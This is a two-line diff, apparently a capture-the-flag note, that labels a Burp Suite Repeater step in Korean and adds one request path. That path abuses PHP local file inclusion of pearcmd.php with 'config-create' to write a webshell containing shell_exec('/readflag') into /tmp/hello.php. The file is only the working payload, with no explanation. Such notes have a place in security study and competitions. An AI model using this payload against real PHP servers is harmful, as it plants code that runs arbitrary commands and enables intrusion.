@@ -1,0 +1,2 @@
+버프스위트 리피터
+/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=shell_exec("/readflag")?>+/tmp/hello.php
